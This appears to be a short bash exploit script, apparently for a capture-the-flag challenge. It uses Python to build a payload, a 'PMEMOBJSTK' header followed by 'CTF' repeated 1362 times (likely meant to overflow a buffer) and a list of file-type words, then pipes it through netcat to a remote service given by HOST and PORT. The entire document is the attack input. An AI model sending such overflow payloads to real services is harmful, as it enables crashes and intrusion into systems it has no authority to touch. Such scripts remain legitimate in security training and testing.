#!/bin/bash
python3 -c 'print("PMEMOBJSTK"+"CTF"*1362+"JPEG\nPNG\nGIF\nPDF\nELF\nASCII\nQUIT")' | nc $HOST $PORT
